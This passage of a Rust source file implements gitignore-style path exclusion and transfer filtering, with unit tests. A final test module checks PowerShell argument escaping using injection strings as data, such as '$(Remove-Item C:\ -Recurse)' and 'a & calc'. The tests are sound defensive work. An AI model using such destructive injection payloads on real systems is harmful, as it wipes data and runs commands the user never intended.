            max_mtime_ms: None,
            file_kinds: Vec::new(),
        }
    }
}

static EXCLUSION_CONFIG: LazyLock<RwLock<ExclusionConfig>> = LazyLock::new(|| {
    RwLock::new(ExclusionConfig::default())
});

pub fn update_exclusion_config(config: ExclusionConfig) {
    if let Ok(mut w) = EXCLUSION_CONFIG.write() {
        *w = config;
    }
}

pub fn get_exclusion_config() -> ExclusionConfig {
    EXCLUSION_CONFIG.read().map(|r| r.clone()).unwrap_or_default()
}

pub fn should_respect_gitignore() -> bool {
    let config = match EXCLUSION_CONFIG.read() {
        Ok(guard) => guard,
        Err(poisoned) => poisoned.into_inner(),
    };
    config.enabled && config.respect_gitignore
}

pub fn matches_exclusion_pattern(name: &str, pattern: &str) -> bool {
    let pat = pattern.trim().trim_end_matches('/');
    if pat.is_empty() {
        return false;
    }
    if let Some(suffix) = pat.strip_prefix('*') {
        if !suffix.contains(['*', '?', '[', '/']) {
            return name.ends_with(suffix);
        }
    } else if let Some(prefix) = pat.strip_suffix('*') {
        if !prefix.contains(['*', '?', '[', '/']) {
            return name.starts_with(prefix);
        }
    } else if !pat.contains(['*', '?', '[', '/']) {
        return name.eq_ignore_ascii_case(pat);
    }
    if let Some(rule) = parse_gitignore_rule(pattern) {
        let rel_norm = normalize_rel_posix_path(name);
        let segs: Vec<&str> = rel_norm.split('/').filter(|s| !s.is_empty()).collect();
        if segs.is_empty() {
            return false;
        }
        return match_exact_segments(&rule, &segs, true);
    }
    false
}

#[derive(Debug, Clone)]
struct GitignoreRule {
    negated: bool,
    dir_only: bool,
    anchored: bool,
    segments: Vec<String>,
}

fn trim_trailing_unescaped_spaces(s: &str) -> &str {
    let bytes = s.as_bytes();
    let mut end = bytes.len();
    while end > 0 && (bytes[end - 1] == b' ' || bytes[end - 1] == b'\t') {
        // Count preceding backslashes; odd number means this space is escaped
        let mut backslashes = 0usize;
        let mut idx = end - 1;
        while idx > 0 && bytes[idx - 1] == b'\\' {
            backslashes += 1;
            idx -= 1;
        }
        if backslashes % 2 == 1 {
            break;
        }
        end -= 1;
    }
    &s[..end]
}

fn parse_gitignore_rule(raw: &str) -> Option<GitignoreRule> {
    let s = raw.trim_end_matches('\r');
    let s = trim_trailing_unescaped_spaces(s);
    // Trim leading unescaped whitespace if the rest is empty or starts with unescaped whitespace
    let s = s.strip_prefix(|c: char| c == ' ' || c == '\t').map_or(s, |_| s.trim_start());
    if s.is_empty() || s.starts_with('#') {
        return None;
    }

    let (negated, s) = if let Some(rest) = s.strip_prefix('!') {
        (true, rest)
    } else {
        (false, s)
    };
    if s.is_empty() {
        return None;
    }

    let dir_only = s.ends_with('/');
    let s = s.trim_end_matches('/');
    if s.is_empty() {
        return None;
    }

    let (anchored, s) = if let Some(rest) = s.strip_prefix('/') {
        (true, rest)
    } else {
        (s.contains('/'), s)
    };
    let s = s.trim_start_matches('/');
    if s.is_empty() {
        return None;
    }

    let segments: Vec<String> = s
        .split('/')
        .filter(|seg| !seg.is_empty())
        .map(|seg| seg.to_string())
        .collect();
    if segments.is_empty() {
        return None;
    }

    Some(GitignoreRule {
        negated,
        dir_only,
        anchored,
        segments,
    })
}

fn normalize_rel_posix_path(path: &str) -> String {
    let replaced = path.replace('\\', "/");
    let trimmed = replaced.trim_start_matches("./").trim_matches('/');
    trimmed.to_string()
}

/// Match a single path segment against a glob pattern supporting `*`, `?`, `[abc]`/`[a-z]`/`[!a-z]`, and `\` escapes.
fn match_segment_glob(pat: &str, text: &str) -> bool {
    let p: Vec<char> = pat.chars().collect();
    let t: Vec<char> = text.chars().collect();
    let mut memo: Vec<Option<bool>> = vec![None; (p.len() + 1) * (t.len() + 1)];
    let stride = t.len() + 1;

    fn match_char_class(p: &[char], idx: usize, ch: char) -> Option<(bool, usize)> {
        // p[idx] == '['
        let mut i = idx + 1;
        if i >= p.len() {
            return None;
        }
        let negated = if p[i] == '!' || p[i] == '^' {
            i += 1;
            true
        } else {
            false
        };
        let mut matched = false;
        let mut first = true;
        while i < p.len() {
            if p[i] == ']' && !first {
                return Some((matched ^ negated, i + 1));
            }
            first = false;
            let start_ch = if p[i] == '\\' && i + 1 < p.len() {
                i += 1;
                let c = p[i];
                i += 1;
                c
            } else {
                let c = p[i];
                i += 1;
                c
            };
            if i + 1 < p.len() && p[i] == '-' && p[i + 1] != ']' {
                i += 1; // skip '-'
                let end_ch = if p[i] == '\\' && i + 1 < p.len() {
                    i += 1;
                    let c = p[i];
                    i += 1;
                    c
                } else {
                    let c = p[i];
                    i += 1;
                    c
                };
                if ch >= start_ch && ch <= end_ch {
                    matched = true;
                }
            } else if ch == start_ch {
                matched = true;
            }
        }
        None
    }

    fn dp(
        pi: usize,
        ti: usize,
        p: &[char],
        t: &[char],
        stride: usize,
        memo: &mut [Option<bool>],
    ) -> bool {
        let key = pi * stride + ti;
        if let Some(res) = memo[key] {
            return res;
        }
        let ans = if pi == p.len() {
            ti == t.len()
        } else if p[pi] == '*' {
            // Collapse consecutive '*'
            let mut next_pi = pi + 1;
            while next_pi < p.len() && p[next_pi] == '*' {
                next_pi += 1;
            }
            dp(next_pi, ti, p, t, stride, memo)
                || (ti < t.len() && dp(pi, ti + 1, p, t, stride, memo))
        } else if p[pi] == '?' {
            ti < t.len() && dp(pi + 1, ti + 1, p, t, stride, memo)
        } else if p[pi] == '[' {
            if let Some((class_ok, next_pi)) = match_char_class(p, pi, t.get(ti).copied().unwrap_or('\0')) {
                ti < t.len() && class_ok && dp(next_pi, ti + 1, p, t, stride, memo)
            } else {
                // Unclosed '[', treat literally
                ti < t.len() && t[ti] == '[' && dp(pi + 1, ti + 1, p, t, stride, memo)
            }
        } else if p[pi] == '\\' && pi + 1 < p.len() {
            ti < t.len() && t[ti] == p[pi + 1] && dp(pi + 2, ti + 1, p, t, stride, memo)
        } else {
            ti < t.len() && t[ti] == p[pi] && dp(pi + 1, ti + 1, p, t, stride, memo)
        };
        memo[key] = Some(ans);
        ans
    }

    dp(0, 0, &p, &t, stride, &mut memo)
}

fn match_path_segments_with_doublestar(pat_segs: &[String], path_segs: &[&str]) -> bool {
    let pn = pat_segs.len();
    let sn = path_segs.len();
    // Trailing `/**` (with prefix) matches entries *inside* the directory, not the directory itself.
    let trailing_dir_glob = pn >= 2 && pat_segs[pn - 1] == "**";

    let mut memo: Vec<Option<bool>> = vec![None; (pn + 1) * (sn + 1)];
    let stride = sn + 1;

    fn dp(
        pi: usize,
        si: usize,
        pat_segs: &[String],
        path_segs: &[&str],
        trailing_dir_glob: bool,
        stride: usize,
        memo: &mut [Option<bool>],
    ) -> bool {
        let key = pi * stride + si;
        if let Some(res) = memo[key] {
            return res;
        }
        let ans = if pi == pat_segs.len() {
            si == path_segs.len()
        } else if pat_segs[pi] == "**" {
            let is_trailing = trailing_dir_glob && pi + 1 == pat_segs.len();
            if is_trailing {
                // Must consume at least 1 segment
                si < path_segs.len()
            } else {
                // Match 0 segments or 1+ segments
                dp(pi + 1, si, pat_segs, path_segs, trailing_dir_glob, stride, memo)
                    || (si < path_segs.len()
                        && dp(pi, si + 1, pat_segs, path_segs, trailing_dir_glob, stride, memo))
            }
        } else if si < path_segs.len() {
            match_segment_glob(&pat_segs[pi], path_segs[si])
                && dp(pi + 1, si + 1, pat_segs, path_segs, trailing_dir_glob, stride, memo)
        } else {
            false
        };
        memo[key] = Some(ans);
        ans
    }

    dp(0, 0, pat_segs, path_segs, trailing_dir_glob, stride, &mut memo)
}

fn match_exact_segments(rule: &GitignoreRule, target_segs: &[&str], target_is_dir: bool) -> bool {
    if rule.dir_only && !target_is_dir {
        return false;
    }
    if target_segs.is_empty() {
        return false;
    }
    if !rule.anchored {
        if rule.segments.len() == 1 && rule.segments[0] == "**" {
            return true;
        }
        if let Some(last) = target_segs.last() {
            return rule.segments.len() == 1 && match_segment_glob(&rule.segments[0], last);
        }
        return false;
    }
    match_path_segments_with_doublestar(&rule.segments, target_segs)
}

/// Evaluate ordered gitignore-style rules against `(rel_segs, is_dir)`.
/// Returns `true` if the final matching state is positive (matched/ignored), `false` otherwise.
fn evaluate_rules(rules: &[GitignoreRule], rel_segs: &[&str], is_dir: bool, initial_state: bool) -> bool {
    if rel_segs.is_empty() {
        return initial_state;
    }

    // Step 1: check if any parent directory prefix is excluded by an earlier rule
    // (unless a subsequent rule explicitly negates the full path).
    for prefix_len in 1..rel_segs.len() {
        let prefix = &rel_segs[..prefix_len];
        let mut prefix_ignored = false;
        let mut last_ignoring_idx: Option<usize> = None;
        for (idx, rule) in rules.iter().enumerate() {
            if match_exact_segments(rule, prefix, true) {
                if rule.negated {
                    prefix_ignored = false;
                } else {
                    prefix_ignored = true;
                    last_ignoring_idx = Some(idx);
                }
            }
        }
        if prefix_ignored {
            // Check if a later rule after `last_ignoring_idx` explicitly un-ignores `rel_segs`
            let mut rescued = false;
            if let Some(ign_idx) = last_ignoring_idx {
                for rule in &rules[ign_idx + 1..] {
                    if match_exact_segments(rule, rel_segs, is_dir) {
                        rescued = rule.negated;
                    }
                }
            }
            if !rescued {
                return true;
            }
        }
    }

    // Step 2: evaluate full path against all rules in order (last match wins)
    let mut state = initial_state;
    for rule in rules {
        if match_exact_segments(rule, rel_segs, is_dir) {
            state = !rule.negated;
        }
    }
    state
}

fn compile_rules<'a>(raw_iter: impl Iterator<Item = &'a String>) -> Vec<GitignoreRule> {
    raw_iter.filter_map(|r| parse_gitignore_rule(r)).collect()
}

pub fn is_ignored(name: &str) -> bool {
    is_ignored_entry(name, name, true, &[])
}

pub fn is_ignored_with_extra(name: &str, extra_rules: &[String]) -> bool {
    is_ignored_entry(name, name, true, extra_rules)
}

/// Check whether an entry (file or directory) is excluded by `ExclusionConfig.patterns`
/// and (when `respect_gitignore` is enabled) `extra_rules`.
pub fn is_ignored_entry(name: &str, rel_path: &str, is_dir: bool, extra_rules: &[String]) -> bool {
    let config = match EXCLUSION_CONFIG.read() {
        Ok(guard) => guard.clone(),
        Err(poisoned) => poisoned.into_inner().clone(),
    };
    if !config.enabled {
        return false;
    }
    let effective_path = if rel_path.trim().is_empty() {
        name.to_string()
    } else {
        normalize_rel_posix_path(rel_path)
    };
    let segs: Vec<&str> = effective_path.split('/').filter(|s| !s.is_empty()).collect();
    if segs.is_empty() {
        return false;
    }

    let mut rules = compile_rules(config.patterns.iter());
    if config.respect_gitignore && !extra_rules.is_empty() {
        rules.extend(compile_rules(extra_rules.iter()));
    }
    evaluate_rules(&rules, &segs, is_dir, false)
}

/// Evaluate whether an entry should be transferred/included under the active `ExclusionConfig`:
/// checks exclusion patterns, extra `.gitignore` rules, `include_patterns` (whitelist for non-directory
/// entries when non-empty), `min_size_bytes`/`max_size_bytes`, `min_mtime_ms`/`max_mtime_ms`, and `file_kinds`.
pub fn should_transfer_entry(
    name: &str,
    rel_path: &str,
    is_dir: bool,
    size_bytes: Option<u64>,
    mtime_ms: Option<i64>,
    extra_gitignore_rules: &[String],
) -> bool {
    should_transfer_entry_with_kind(
        name,
        rel_path,
        is_dir,
        false,
        size_bytes,
        mtime_ms,
        extra_gitignore_rules,
    )
}

pub fn should_transfer_entry_with_kind(
    name: &str,
    rel_path: &str,
    is_dir: bool,
    is_symlink: bool,
    size_bytes: Option<u64>,
    mtime_ms: Option<i64>,
    extra_gitignore_rules: &[String],
) -> bool {
    let config = match EXCLUSION_CONFIG.read() {
        Ok(guard) => guard.clone(),
        Err(poisoned) => poisoned.into_inner().clone(),
    };
    if !config.enabled {
        return true;
    }

    let effective_path = if rel_path.trim().is_empty() {
        name.to_string()
    } else {
        normalize_rel_posix_path(rel_path)
    };
    let segs: Vec<&str> = effective_path.split('/').filter(|s| !s.is_empty()).collect();
    if segs.is_empty() {
        return false;
    }

    // 1. Exclusion patterns + optional .gitignore rules
    let mut exclude_rules = compile_rules(config.patterns.iter());
    if config.respect_gitignore && !extra_gitignore_rules.is_empty() {
        exclude_rules.extend(compile_rules(extra_gitignore_rules.iter()));
    }
    if evaluate_rules(&exclude_rules, &segs, is_dir, false) {
        return false;
    }

    // 2. File kinds filter (when non-empty)
    if !config.file_kinds.is_empty() {
        let entry_kind = if is_symlink {
            "symlink"
        } else if is_dir {
            "dir"
        } else {
            "file"
        };
        let kind_allowed = config.file_kinds.iter().any(|k| {
            let norm = k.trim().to_ascii_lowercase();
            norm == entry_kind || (entry_kind == "dir" && norm == "directory")
        });
        if !kind_allowed {
            return false;
        }
    }

    // Directories are not filtered by include_patterns / size / mtime so tree traversal
    // can still descend into subdirectories to locate matching files.
    if is_dir {
        return true;
    }

    // 3. Include patterns whitelist (non-directory entries)
    if !config.include_patterns.is_empty() {
        let include_rules = compile_rules(config.include_patterns.iter());
        if !include_rules.is_empty() && !evaluate_rules(&include_rules, &segs, false, false) {
            return false;
        }
    }

    // 4. Size range filter
    if let Some(sz) = size_bytes {
        if let Some(min_sz) = config.min_size_bytes {
            if sz < min_sz {
                return false;
            }
        }
        if let Some(max_sz) = config.max_size_bytes {
            if sz > max_sz {
                return false;
            }
        }
    }

    // 5. Modification time range filter (ms since epoch)
    if let Some(mt) = mtime_ms {
        if let Some(min_mt) = config.min_mtime_ms {
            if mt < min_mt {
                return false;
            }
        }
        if let Some(max_mt) = config.max_mtime_ms {
            if mt > max_mt {
                return false;
            }
        }
    }

    true
}

/// Scope raw `.gitignore` rule lines to a subdirectory relative POSIX prefix (e.g. `"packages/app"`).
/// When `rel_prefix` is empty, rules are preserved as-is.
pub fn parse_gitignore_content_scoped(content: &str, rel_prefix: &str) -> Vec<String> {
    let norm_prefix = normalize_rel_posix_path(rel_prefix);
    let mut rules = Vec::new();
    for line in content.lines() {
        let raw = trim_trailing_unescaped_spaces(line.trim_end_matches('\r'));
        let trimmed = raw.strip_prefix(|c: char| c == ' ' || c == '\t').map_or(raw, |_| raw.trim_start());
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        if norm_prefix.is_empty() {
            rules.push(trimmed.to_string());
            continue;
        }
        let (neg_prefix, body) = if let Some(rest) = trimmed.strip_prefix('!') {
            ("!", rest)
        } else {
            ("", trimmed)
        };
        if body.is_empty() {
            continue;
        }
        let dir_suffix = if body.ends_with('/') { "/" } else { "" };
        let body_no_trailing = body.trim_end_matches('/');
        if body_no_trailing.is_empty() {
            continue;
        }
        let scoped = if let Some(anchored_body) = body_no_trailing.strip_prefix('/') {
            format!("{}/{}/{}{}", neg_prefix, norm_prefix, anchored_body, dir_suffix)
        } else if body_no_trailing.contains('/') {
            format!("{}/{}/{}{}", neg_prefix, norm_prefix, body_no_trailing, dir_suffix)
        } else {
            format!("{}/{}/**/{}{}", neg_prefix, norm_prefix, body_no_trailing, dir_suffix)
        };
        rules.push(scoped);
    }
    rules
}

/// 解析本地目录下的 .gitignore 文件中的有效规则（根目录作用域）
pub fn parse_gitignore_in_dir(dir: &std::path::Path) -> Vec<String> {
    parse_gitignore_in_dir_scoped(dir, "")
}

/// 解析本地目录下的 .gitignore 文件中的有效规则，并绑定相对路径前缀作用域
pub fn parse_gitignore_in_dir_scoped(dir: &std::path::Path, rel_prefix: &str) -> Vec<String> {
    if !should_respect_gitignore() {
        return Vec::new();
    }

    let gitignore_path = dir.join(".gitignore");
    if !gitignore_path.is_file() {
        return Vec::new();
    }
    if let Ok(content) = std::fs::read_to_string(&gitignore_path) {
        parse_gitignore_content_scoped(&content, rel_prefix)
    } else {
        Vec::new()
    }
}

#[cfg(test)]
mod exclusion_tests {
    use super::*;
    use std::sync::Mutex;

    // Serialize exclusion tests because EXCLUSION_CONFIG is process-global state.
    static EXCLUSION_TEST_LOCK: LazyLock<Mutex<()>> = LazyLock::new(|| Mutex::new(()));

    #[test]
    fn test_matches_exclusion_pattern() {
        assert!(matches_exclusion_pattern(".git", ".git"));
        assert!(matches_exclusion_pattern("node_modules", "node_modules/"));
        assert!(matches_exclusion_pattern("app.log", "*.log"));
        assert!(matches_exclusion_pattern("build_temp", "build_*"));
        assert!(!matches_exclusion_pattern("src", "dist"));
    }

    #[test]
    fn test_exclusion_config_toggle() {
        let _guard = EXCLUSION_TEST_LOCK.lock().unwrap();
        update_exclusion_config(ExclusionConfig {
            enabled: false,
            patterns: vec![".git".to_string()],
            respect_gitignore: false,
            ..ExclusionConfig::default()
        });
        assert!(!is_ignored(".git"));

        update_exclusion_config(ExclusionConfig {
            enabled: true,
            patterns: vec![".git".to_string(), "target".to_string()],
            respect_gitignore: false,
            ..ExclusionConfig::default()
        });
        assert!(is_ignored(".git"));
        assert!(is_ignored("target"));
        assert!(!is_ignored("src"));

        // 恢复默认配置（默认不进行任何过滤处理）
        update_exclusion_config(ExclusionConfig::default());
        assert!(!is_ignored("node_modules"));
        assert!(!is_ignored(".git"));
    }

    #[test]
    fn test_gitignore_negation_and_comments() {
        let _guard = EXCLUSION_TEST_LOCK.lock().unwrap();
        let rules = parse_gitignore_content_scoped(
            "# comment line\n\\#hashfile\n*.log\n!important.log\n",
            "",
        );
        update_exclusion_config(ExclusionConfig {
            enabled: true,
            patterns: vec![],
            respect_gitignore: true,
            ..ExclusionConfig::default()
        });

        assert!(!should_transfer_entry("app.log", "app.log", false, Some(10), None, &rules));
        assert!(should_transfer_entry("important.log", "important.log", false, Some(10), None, &rules));
        assert!(!should_transfer_entry("#hashfile", "#hashfile", false, Some(10), None, &rules));
        assert!(should_transfer_entry("comment line", "comment line", false, Some(10), None, &rules));

        update_exclusion_config(ExclusionConfig::default());
    }

    #[test]
    fn test_gitignore_anchors_doublestar_and_trailing_slash() {
        let _guard = EXCLUSION_TEST_LOCK.lock().unwrap();
        let rules = parse_gitignore_content_scoped(
            "/root_only\nbuild/\n**/cache\na/**/b.txt\n[ab]?.txt\n",
            "",
        );
        update_exclusion_config(ExclusionConfig {
            enabled: true,
            patterns: vec![],
            respect_gitignore: true,
            ..ExclusionConfig::default()
        });

        // Leading '/' anchors to root
        assert!(!should_transfer_entry("root_only", "root_only", false, Some(1), None, &rules));
        assert!(should_transfer_entry("root_only", "sub/root_only", false, Some(1), None, &rules));

        // Trailing '/' matches directories only (and contents under them)
        assert!(!should_transfer_entry("build", "build", true, None, None, &rules));
        assert!(should_transfer_entry("build", "build", false, Some(1), None, &rules));
        assert!(!should_transfer_entry("out.o", "src/build/out.o", false, Some(1), None, &rules));

        // '**' recursive globs
        assert!(!should_transfer_entry("cache", "cache", true, None, None, &rules));
        assert!(!should_transfer_entry("cache", "x/y/cache", true, None, None, &rules));
        assert!(!should_transfer_entry("b.txt", "a/b.txt", false, Some(1), None, &rules));
        assert!(!should_transfer_entry("b.txt", "a/x/y/b.txt", false, Some(1), None, &rules));
        assert!(should_transfer_entry("c.txt", "a/x/c.txt", false, Some(1), None, &rules));

        // Character class & '?'
        assert!(!should_transfer_entry("a1.txt", "a1.txt", false, Some(1), None, &rules));
        assert!(!should_transfer_entry("bz.txt", "sub/bz.txt", false, Some(1), None, &rules));
        assert!(should_transfer_entry("c1.txt", "c1.txt", false, Some(1), None, &rules));
        assert!(should_transfer_entry("a12.txt", "a12.txt", false, Some(1), None, &rules));

        update_exclusion_config(ExclusionConfig::default());
    }

    #[test]
    fn test_include_patterns_size_mtime_and_kinds() {
        let _guard = EXCLUSION_TEST_LOCK.lock().unwrap();
        update_exclusion_config(ExclusionConfig {
            enabled: true,
            patterns: vec!["target/".to_string()],
            respect_gitignore: false,
            include_patterns: vec!["*.rs".to_string(), "!*_test.rs".to_string()],
            min_size_bytes: Some(100),
            max_size_bytes: Some(1000),
            min_mtime_ms: Some(1_700_000_000_000),
            max_mtime_ms: Some(1_800_000_000_000),
            file_kinds: vec!["file".to_string(), "dir".to_string()],
        });

        // Excluded dir still excluded
        assert!(!should_transfer_entry("target", "target", true, None, None, &[]));
        // Normal dir allowed so traversal continues
        assert!(should_transfer_entry("src", "src", true, None, None, &[]));
        // Matching file within size & mtime bounds
        assert!(should_transfer_entry(
            "main.rs",
            "src/main.rs",
            false,
            Some(500),
            Some(1_750_000_000_000),
            &[]
        ));
        // Non-matching extension rejected by include_patterns
        assert!(!should_transfer_entry(
            "README.md",
            "README.md",
            false,
            Some(500),
            Some(1_750_000_000_000),
            &[]
        ));
        // Negated include pattern rejects *_test.rs
        assert!(!should_transfer_entry(
            "foo_test.rs",
            "src/foo_test.rs",
            false,
            Some(500),
            Some(1_750_000_000_000),
            &[]
        ));
        // Too small / too large
        assert!(!should_transfer_entry(
            "small.rs",
            "src/small.rs",
            false,
            Some(50),
            Some(1_750_000_000_000),
            &[]
        ));
        assert!(!should_transfer_entry(
            "big.rs",
            "src/big.rs",
            false,
            Some(2000),
            Some(1_750_000_000_000),
            &[]
        ));
        // Out of mtime range
        assert!(!should_transfer_entry(
            "old.rs",
            "src/old.rs",
            false,
            Some(500),
            Some(1_600_000_000_000),
            &[]
        ));
        assert!(!should_transfer_entry(
            "new.rs",
            "src/new.rs",
            false,
            Some(500),
            Some(1_900_000_000_000),
            &[]
        ));
        // Symlink rejected when file_kinds = ["file", "dir"]
        assert!(!should_transfer_entry_with_kind(
            "link.rs",
            "src/link.rs",
            false,
            true,
            Some(500),
            Some(1_750_000_000_000),
            &[]
        ));

        update_exclusion_config(ExclusionConfig::default());
    }
}

/// PowerShell 参数转义与 `-EncodedCommand` 构建的回归测试。
///
/// 这两者共同构成 Windows 远端命令注入的最后防线：
/// 转义失效或编码格式错误都会让用户输入被远端 shell 解释执行。
#[cfg(test)]
mod powershell_escape_tests {
    use super::{build_powershell_command, escape_powershell_arg};

    #[test]
    fn wraps_plain_argument_in_single_quotes() {
        assert_eq!(
            escape_powershell_arg("C:\\Users\\demo".to_string()),
            "'C:\\Users\\demo'"
        );
    }

    #[test]
    fn doubles_embedded_single_quotes() {
        assert_eq!(escape_powershell_arg("it's".to_string()), "'it''s'");
        assert_eq!(escape_powershell_arg("a'b'c".to_string()), "'a''b''c'");
    }

    #[test]
    fn strips_null_bytes() {
        assert_eq!(escape_powershell_arg("a\0b".to_string()), "'ab'");
        assert_eq!(escape_powershell_arg("\0".to_string()), "''");
    }

    #[test]
    fn keeps_injection_payloads_literal() {
        for p in [
            "$(Remove-Item C:\\ -Recurse)",
            "`whoami`",
            "a; Remove-Item C:\\ -Recurse",
            "a | Out-File x",
            "a & calc",
            "a\nb",
            "报告 🎉",
        ] {
            let quoted = escape_powershell_arg(p.to_string());
            assert!(quoted.starts_with('\''), "not quoted: {quoted}");
            assert!(quoted.ends_with('\''), "not quoted: {quoted}");
            // 单引号内所有字符都是字面量；只需确认没有未成对的裸单引号
            let inner = &quoted[1..quoted.len() - 1];
            let mut chars = inner.chars().peekable();
            while let Some(c) = chars.next() {
                if c == '\'' {
                    assert_eq!(chars.next(), Some('\''), "unescaped single quote in {quoted}");
                }
            }
        }
    }

    #[test]
    fn builds_cmd_wrapped_encoded_command() {
        let cmd = build_powershell_command("Get-ChildItem C:\\");
        assert!(cmd.starts_with(
            "C:\\Windows\\System32\\cmd.exe /c powershell.exe -NoProfile -NonInteractive -EncodedCommand "
        ));
        // Base64 段只含 [A-Za-z0-9+/=]，可安全作为裸参数传递
        let encoded = cmd.rsplit(' ').next().unwrap();
        assert!(!encoded.is_empty());
        assert!(encoded
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '='));
    }

    #[test]
    fn encoded_command_round_trips_as_utf16le() {
        use base64::{engine::general_purpose, Engine};

        let script = "Write-Output '你好，世界'";
        let cmd = build_powershell_command(script);
        let encoded = cmd.rsplit(' ').next().unwrap();
        let bytes = general_purpose::STANDARD.decode(encoded).unwrap();
        let units: Vec<u16> = bytes
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        assert_eq!(String::from_utf16(&units).unwrap(), script);
    }

    #[test]
    fn handles_empty_script() {
        let cmd = build_powershell_command("");
        assert!(cmd.contains("-EncodedCommand"));
        assert!(cmd.ends_with("-EncodedCommand "));
    }
}

